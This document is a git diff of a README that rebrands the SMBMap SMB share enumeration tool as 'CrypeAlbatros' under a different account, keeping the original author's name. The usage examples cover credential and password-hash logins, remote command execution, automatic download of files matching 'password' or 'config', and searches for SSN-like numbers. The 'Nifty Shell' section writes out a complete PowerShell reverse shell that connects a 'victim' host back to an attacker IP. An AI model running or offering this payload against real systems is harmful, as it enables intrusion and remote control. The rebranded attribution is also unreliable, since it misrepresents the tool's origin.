@@ -1,19 +1,19 @@
-# SMBMap
+# CrypeAlbatros
 
-SMBMap allows users to enumerate samba share drives across an entire domain. List share drives, drive permissions, share contents, upload/download functionality, file name auto-download pattern matching, and even execute remote commands. This tool was designed with pen testing in mind, and is intended to simplify searching for potentially sensitive data across large networks.
+CrypeAlbatros allows users to enumerate samba share drives across an entire domain. List share drives, drive permissions, share contents, upload/download functionality, file name auto-download pattern matching, and even execute remote commands. This tool was designed with pen testing in mind, and is intended to simplify searching for potentially sensitive data across large networks.
 
 Some of the features have not been thoroughly tested, so changes will be forth coming as bugs are found. I only really find and fix the bugs while I'm on engagements, so progress is a bit slow. Any feedback or bug reports would be appreciated. 
 
 > **Note**
-> SMBMap has been updated to Python3!
+> CrypeAlbatros has been updated to Python3 & C
 
 ## Installation
 
 ```bash
-$ sudo pip3 install smbmap
-$ smbmap
-smbmap
-usage: smbmap [-h] (-H HOST | --host-file FILE) [-u USERNAME] [-p PASSWORD | --prompt] [-s SHARE] [-d DOMAIN]
+$ sudo pip3 install CrypeAlbatros
+$ cd CrypeAlbatros
+CrypeAlbatros
+usage: crypealbatros [-h] (-H HOST | --host-file FILE) [-u USERNAME] [-p PASSWORD | --prompt] [-s SHARE] [-d DOMAIN]
               [-P PORT] [-v] [--admin] [--no-banner] [--no-color] [--no-update] [-x COMMAND] [--mode CMDMODE]
               [-L | -r [PATH]] [-A PATTERN | -g FILE | --csv FILE] [--dir-only] [--no-write-check]
               [-q] [--depth DEPTH] [--exclude SHARE [SHARE ...]] [-F PATTERN] [--search-path PATH]
@@ -35,7 +35,7 @@ usage: smbmap [-h] (-H HOST | --host-file FILE) [-u USERNAME] [-p PASSWORD | --p
 
 ## Help
 ```
-usage: smbmap.py [-h] (-H HOST | --host-file FILE) [-u USERNAME] [-p PASSWORD | --prompt] [-k] [--no-pass] [--dc-ip IP or Host] [-s SHARE] [-d DOMAIN] [-P PORT] [-v] [--signing] [--admin] [--no-banner] [--no-color] [--no-update]
+usage: crypealbatros.py [-h] (-H HOST | --host-file FILE) [-u USERNAME] [-p PASSWORD | --prompt] [-k] [--no-pass] [--dc-ip IP or Host] [-s SHARE] [-d DOMAIN] [-P PORT] [-v] [--signing] [--admin] [--no-banner] [--no-color] [--no-update]
                  [--timeout SCAN_TIMEOUT] [-x COMMAND] [--mode CMDMODE] [-L | -r [PATH]] [-g FILE | --csv FILE] [--dir-only] [--no-write-check] [-q] [--depth DEPTH] [--exclude SHARE [SHARE ...]] [-A PATTERN] [-F PATTERN]
                  [--search-path PATH] [--search-timeout TIMEOUT] [--download PATH] [--upload SRC DST] [--delete PATH TO FILE] [--skip]
 
@@ -47,8 +47,8 @@ usage: smbmap.py [-h] (-H HOST | --host-file FILE) [-u USERNAME] [-p PASSWORD | 
    /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
   (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
-SMBMap - Samba Share Enumerator v1.10.4 | Shawn Evans - ShawnDEvans@gmail.com<mailto:ShawnDEvans@gmail.com>
-                     https://github.com/ShawnDEvans/smbmap
+CrypeAlbatros - Samba Share Enumerator v1.10.4 | Shawn Evans - byt3n33dl3@proton.me<mailto:byt3n33dl3@proton.me>
+                     https://github.com/byt3n33dl3/CrypeAlbatros
 
 options:
   -h, --help            show this help message and exit
@@ -118,14 +118,14 @@ Filesystem interaction:
 
 Examples:
 
-$ python smbmap.py -u jsmith -p password1 -d workgroup -H 192.168.0.1
-$ python smbmap.py -u jsmith -p 'aad3b435b51404eeaad3b435b51404ee:da76f2c4c96028b7a6111aef4a50a94d' -H 172.16.0.20
-$ python smbmap.py -u 'apadmin' -p 'asdf1234!' -d ACME -Hh 10.1.3.30 -x 'net group "Domain Admins" /domain'
+$ python crypealbatros.py -u jsmith -p password1 -d workgroup -H 192.168.0.1
+$ python crypealbatros.py -u jsmith -p 'aad3b435b51404eeaad3b435b51404ee:da76f2c4c96028b7a6111aef4a50a94d' -H 172.16.0.20
+$ python crypealbatros.py -u 'apadmin' -p 'asdf1234!' -d ACME -Hh 10.1.3.30 -x 'net group "Domain Admins" /domain'
 ```
 
 ## Default Output:
 ```
-$ ./smbmap.py -H 192.168.86.214 -u Administrator -p asdf1234                                         
+$ ./crypealbatros.py -H 192.168.86.214 -u Administrator -p asdf1234                                         
 
     ________  ___      ___  _______   ___      ___       __         _______
    /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
@@ -135,13 +135,13 @@ $ ./smbmap.py -H 192.168.86.214 -u Administrator -p asdf1234
    /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
   (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
  -----------------------------------------------------------------------------
-     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
-                     https://github.com/ShawnDEvans/smbmap
+     CrypeAlbatros - Samba Share Enumerator | Shawn Evans - byt3n33dl3@proton.me
+                     https://github.com/byt3n33dl3/CrypeAlbatros
 
 [*] Detected 1 hosts serving SMB                                                                                                  
 [*] Established 1 SMB connections(s) and 1 authentidated session(s)                                                      
                                                                                                                                             
-[+] IP: 192.168.86.214:445	Name: shawnevans-pc.lan   	Status: ADMIN!!!   	
+[+] IP: 192.168.86.214:445	Name: byt3n33dl3-pc.lan   	Status: ADMIN!!!   	
 	Disk                                                  	Permissions	Comment
 	----                                                  	-----------	-------
 	ADMIN$                                            	READ, WRITE	Remote Admin
@@ -155,7 +155,7 @@ $ ./smbmap.py -H 192.168.86.214 -u Administrator -p asdf1234
 
 ## Command execution:
 ```
-$ python smbmap.py -u ariley -p 'P@$$w0rd1234!' -d ABC -x 'net group "Domain Admins" /domain' -H 192.168.2.50
+$ python crypealbatros.py -u ariley -p 'P@$$w0rd1234!' -d ABC -x 'net group "Domain Admins" /domain' -H 192.168.2.50
 [+] Finding open SMB ports....
 [+] User SMB session established...
 [+] IP: 192.168.2.50:445        Name: unknown
@@ -171,7 +171,7 @@ The command completed successfully.
 
 ## Non recursive path listing (ls):
 ```
-$ ./smbmap.py -H 192.168.86.214 -u Administrator -p asdf1234 -r c$ -q     
+$ ./crypealbatros.py -H 192.168.86.214 -u Administrator -p asdf1234 -r c$ -q     
 
     ________  ___      ___  _______   ___      ___       __         _______
    /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
@@ -181,13 +181,13 @@ $ ./smbmap.py -H 192.168.86.214 -u Administrator -p asdf1234 -r c$ -q
    /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
   (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
  -----------------------------------------------------------------------------
-     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
-                     https://github.com/ShawnDEvans/smbmap
+     CrypeAlbatros - Samba Share Enumerator | Shawn Evans - byt3n33dl3@proton.me
+                     https://github.com/byt3n33dl3/CrypeAlbatros
 
 [*] Detected 1 hosts serving SMB                                                                                                  
 [*] Established 1 SMB connections(s) and 1 authentidated session(s)
                                                                                                                                             
-[+] IP: 192.168.86.214:445	Name: shawnevans-pc.lan   	Status: ADMIN!!!   	
+[+] IP: 192.168.86.214:445	Name: byt3n33dl3-pc.lan   	Status: ADMIN!!!   	
 	Disk                                                  	Permissions	Comment
 	----                                                  	-----------	-------
 	ADMIN$                                                 	READ, WRITE	Remote Admin
@@ -223,7 +223,7 @@ $ ./smbmap.py -H 192.168.86.214 -u Administrator -p asdf1234 -r c$ -q
 
 ## Recursive listing 
 ```
-$ ./smbmap.py -H 192.168.86.179 -u Administrator -p asdf1234 -r Tools --depth 2 --no-banner -q
+$ ./crypealbatros.py -H 192.168.86.179 -u Administrator -p asdf1234 -r Tools --depth 2 --no-banner -q
 [*] Detected 1 hosts serving SMB                                                                                                  
 [*] Established 1 SMB connections(s) and 1 authentidated session(s)
                                                                                                                                             
@@ -274,7 +274,7 @@ $ ./smbmap.py -H 192.168.86.179 -u Administrator -p asdf1234 -r Tools --depth 2 
 
 ## Recursive Filename Pattern Search
 ```
-$ ./smbmap.py -H 192.168.86.179 -u Administrator -p asdf1234 -r 'c$/program files' --depth 2 -A '(password|config)'
+$ ./crypealbatros.py -H 192.168.86.179 -u Administrator -p asdf1234 -r 'c$/program files' --depth 2 -A '(password|config)'
 
     ________  ___      ___  _______   ___      ___       __         _______
    /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
@@ -284,21 +284,21 @@ $ ./smbmap.py -H 192.168.86.179 -u Administrator -p asdf1234 -r 'c$/program file
    /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
   (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
  -----------------------------------------------------------------------------
-     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
-                     https://github.com/ShawnDEvans/smbmap
+     CrypeAlbatros - Samba Share Enumerator | Shawn Evans - byt3n33dl3@proton.me
+                     https://github.com/byt3n33dl3/CrypeAlbatros
 
 [*] Detected 1 hosts serving SMB                                                                                                  
 [*] Established 1 SMB connections(s) and 1 authentidated session(s)
 [*] Performing file name pattern match!.                                                                                                    
 [+] Match found! Downloading: C$/program files/Amazon Web Services, Inc/Amazon WorkSpaces/Microsoft.Extensions.Configuration.Abstractions.dll
 [+] Starting download: C$\program files\Amazon Web Services, Inc\Amazon WorkSpaces\Microsoft.Extensions.Configuration.Abstractions.dll (21368 bytes)
-[+] File output to: /home/shawnevans/tools/smbmap/smbmap/192.168.86.179-C_program files_Amazon Web Services, Inc_Amazon WorkSpaces_Microsoft.Extensions.Configuration.Abstractions.dll
+[+] File output to: /home/byt3n33dl3/tools/crypealbatros/crypealbatros/192.168.86.179-C_program files_Amazon Web Services, Inc_Amazon WorkSpaces_Microsoft.Extensions.Configuration.Abstractions.dll
 [+] Match found! Downloading: C$/program files/Amazon Web Services, Inc/Amazon WorkSpaces/Microsoft.Extensions.Configuration.Binder.dll
 [+] Starting download: C$\program files\Amazon Web Services, Inc\Amazon WorkSpaces\Microsoft.Extensions.Configuration.Binder.dll (25464 bytes)
-[+] File output to: /home/shawnevans/tools/smbmap/smbmap/192.168.86.179-C_program files_Amazon Web Services, Inc_Amazon WorkSpaces_Microsoft.Extensions.Configuration.Binder.dll
+[+] File output to: /home/byt3n33dl3/tools/crypealbatros/crypealbatros/192.168.86.179-C_program files_Amazon Web Services, Inc_Amazon WorkSpaces_Microsoft.Extensions.Configuration.Binder.dll
 [+] Match found! Downloading: C$/program files/Amazon Web Services, Inc/Amazon WorkSpaces/Microsoft.Extensions.Configuration.dll
 [+] Starting download: C$\program files\Amazon Web Services, Inc\Amazon WorkSpaces\Microsoft.Extensions.Configuration.dll (27512 bytes)
-[+] File output to: /home/shawnevans/tools/smbmap/smbmap/192.168.86.179-C_program files_Amazon Web Services, Inc_Amazon WorkSpaces_Microsoft.Extensions.Configuration.dll
+[+] File output to: /home/byt3n33dl3/tools/crypealbatros/crypealbatros/192.168.86.179-C_program files_Amazon Web Services, Inc_Amazon WorkSpaces_Microsoft.Extensions.Configuration.dll
 [+] Match found! Downloading: C$/program files/Amazon Web Services, Inc/Amazon WorkSpaces/Microsoft.Extensions.Logging.Configuration.dll
 [+] Starting download: C$\program files\Amazon Web Services, Inc\Amazon WorkSpaces\Microsoft.Extensions.Logging.Configuration.dll (20344 bytes)
 
@@ -306,7 +306,7 @@ $ ./smbmap.py -H 192.168.86.179 -u Administrator -p asdf1234 -r 'c$/program file
 
 ## Scan for SMB signing support
 ```
-$ ./smbmap.py --host-file local.txt --signing
+$ ./crypealbatros.py --host-file local.txt --signing
 
     ________  ___      ___  _______   ___      ___       __         _______
    /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
@@ -316,8 +316,8 @@ $ ./smbmap.py --host-file local.txt --signing
    /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
   (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
  -----------------------------------------------------------------------------
-     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
-                     https://github.com/ShawnDEvans/smbmap
+     CrypeAlbatros - Samba Share Enumerator | Shawn Evans - byt3n33dl3@proton.me
+                     https://github.com/byt3n33dl3/CrypeAlbatros
 
 [*] Detected 3 hosts serving SMB                                                                                                  
 [*] Established 3 SMB connections(s) and 2 authentidated session(s)                                                      
@@ -327,7 +327,7 @@ $ ./smbmap.py --host-file local.txt --signing
 ```
 ## Get version info
 ```
-$ ./smbmap.py --host-file local.txt -v
+$ ./crypealbatros.py --host-file local.txt -v
 
     ________  ___      ___  _______   ___      ___       __         _______
    /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
@@ -337,19 +337,19 @@ $ ./smbmap.py --host-file local.txt -v
    /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
   (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
  -----------------------------------------------------------------------------
-     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
-                     https://github.com/ShawnDEvans/smbmap
+     CrypeAlbatros - Samba Share Enumerator | Shawn Evans - byt3n33dl3@proton.me
+                     https://github.com/byt3n33dl3/CrypeAlbatros
 
 [*] Detected 3 hosts serving SMB                                                                                                  
 [*] Established 3 SMB connections(s) and 2 authentidated session(s)                                                      
-[+] 192.168.86.204   is running Windows 6.1 Build 7601 (name:SHAWNEVANS-PC) (domain:SHAWNEVANS-PC)
-[+] 192.168.86.213   is running Windows 6.1 Build 7601 (name:SHAWNEVANS-PC) (domain:SHAWNEVANS-PC)
+[+] 192.168.86.204   is running Windows 6.1 Build 7601 (name:byt3n33dl3-PC) (domain:byt3n33dl3-PC)
+[+] 192.168.86.213   is running Windows 6.1 Build 7601 (name:byt3n33dl3-PC) (domain:byt3n33dl3-PC)
 [+] 192.168.86.179   is running Windows 10.0 Build 19041 (name:DESKTOP-M8N2DCC) (domain:DESKTOP-M8N2DCC)
 
 ```
 ## File Content Searching:
 ```
-$ python smbmap.py --host-file ~/Desktop/smb-workstation-sml.txt -u NopSec -p 'NopSec1234!' -d widgetworld -F '[1-9][0-9][0-9]-[0-9][0-9]-[0-9][0-9][0-9][0-9]'
+$ python crypealbatros.py --host-file ~/Desktop/smb-workstation-sml.txt -u NopSec -p 'NopSec1234!' -d widgetworld -F '[1-9][0-9][0-9]-[0-9][0-9]-[0-9][0-9][0-9][0-9]'
 [+] Finding open SMB ports....
 [+] User SMB session established on 192.168.0.99...
 [+] User SMB session established on 192.168.0.85...
@@ -386,7 +386,7 @@ C:\Users\biffh\AppData\Local\Temp\Temporary Internet Files\Content.IE5\NV1MNBWA\
 This feature was added to complement the file content searching feature
 
 ```
-$ python smbmap.py -H 192.168.1.24 -u Administrator -p 'R33nisP!nckle' -L
+$ python crypealbatros.py -H 192.168.1.24 -u Administrator -p 'R33nisP!nckle' -L
 [!] Missing domain...defaulting to WORKGROUP
 [+] Finding open SMB ports....
 [+] User SMB session established...
@@ -401,7 +401,7 @@ $ python smbmap.py -H 192.168.1.24 -u Administrator -p 'R33nisP!nckle' -L
 ## Nifty Shell:
 Run Powershell Script on Victim SMB host (change the IP in the code to your IP addres, i.e where the shell connects back to)
 ```
-$ python smbmap.py -u jsmith -p 'R33nisP!nckle' -d ABC -H 192.168.2.50 -x 'powershell -command "function ReverseShellClean {if ($c.Connected -eq $true) {$c.Close()}; if ($p.ExitCode -ne $null) {$p.Close()}; exit; };$a=""""192.168.0.153""""; $port=""""4445"""";$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$port) ;$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize  ;$p=New-Object System.Diagnostics.Process  ;$p.StartInfo.FileName=""""cmd.exe""""  ;$p.StartInfo.RedirectStandardInput=1  ;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0  ;$p.Start()  ;$is=$p.StandardInput  ;$os=$p.StandardOutput  ;Start-Sleep 1  ;$e=new-object System.Text.AsciiEncoding  ;while($os.Peek() -ne -1){$out += $e.GetString($os.Read())} $s.Write($e.GetBytes($out),0,$out.Length)  ;$out=$null;$done=$false;while (-not $done) {if ($c.Connected -ne $true) {cleanup} $pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) { $read=$s.Read($nb,$pos,$nb.Length - $pos); $pos+=$read;if ($pos -and ($nb[0..$($pos-1)] -contains 10)) {break}}  if ($pos -gt 0){ $string=$e.GetString($nb,0,$pos); $is.write($string); start-sleep 1; if ($p.ExitCode -ne $null) {ReverseShellClean} else {  $out=$e.GetString($os.Read());while($os.Peek() -ne -1){ $out += $e.GetString($os.Read());if ($out -eq $string) {$out="""" """"}}  $s.Write($e.GetBytes($out),0,$out.length); $out=$null; $string=$null}} else {ReverseShellClean}};"'
+$ python crypealbatros.py -u jsmith -p 'R33nisP!nckle' -d ABC -H 192.168.2.50 -x 'powershell -command "function ReverseShellClean {if ($c.Connected -eq $true) {$c.Close()}; if ($p.ExitCode -ne $null) {$p.Close()}; exit; };$a=""""192.168.0.153""""; $port=""""4445"""";$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$port) ;$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize  ;$p=New-Object System.Diagnostics.Process  ;$p.StartInfo.FileName=""""cmd.exe""""  ;$p.StartInfo.RedirectStandardInput=1  ;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0  ;$p.Start()  ;$is=$p.StandardInput  ;$os=$p.StandardOutput  ;Start-Sleep 1  ;$e=new-object System.Text.AsciiEncoding  ;while($os.Peek() -ne -1){$out += $e.GetString($os.Read())} $s.Write($e.GetBytes($out),0,$out.Length)  ;$out=$null;$done=$false;while (-not $done) {if ($c.Connected -ne $true) {cleanup} $pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) { $read=$s.Read($nb,$pos,$nb.Length - $pos); $pos+=$read;if ($pos -and ($nb[0..$($pos-1)] -contains 10)) {break}}  if ($pos -gt 0){ $string=$e.GetString($nb,0,$pos); $is.write($string); start-sleep 1; if ($p.ExitCode -ne $null) {ReverseShellClean} else {  $out=$e.GetString($os.Read());while($os.Peek() -ne -1){ $out += $e.GetString($os.Read());if ($out -eq $string) {$out="""" """"}}  $s.Write($e.GetBytes($out),0,$out.length); $out=$null; $string=$null}} else {ReverseShellClean}};"'
 [+] Finding open SMB ports....
 [+] User SMB session established...
 [+] IP: 192.168.2.50:445        Name: unkown
